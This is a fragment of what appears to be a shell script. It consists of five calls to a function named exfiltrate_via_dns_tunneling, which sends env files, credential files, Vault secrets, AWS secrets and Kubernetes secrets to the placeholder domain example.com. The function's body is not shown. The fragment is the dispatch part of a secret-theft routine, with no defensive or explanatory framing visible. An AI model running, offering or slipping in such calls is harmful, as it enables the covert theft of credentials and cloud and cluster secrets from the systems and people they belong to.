exfiltrate_via_dns_tunneling "$env_files" "example.com"
exfiltrate_via_dns_tunneling "$credential_files" "example.com"
exfiltrate_via_dns_tunneling "$vault_secrets" "example.com"
exfiltrate_via_dns_tunneling "$aws_secrets" "example.com"
exfiltrate_via_dns_tunneling "$k8s_secrets" "example.com"
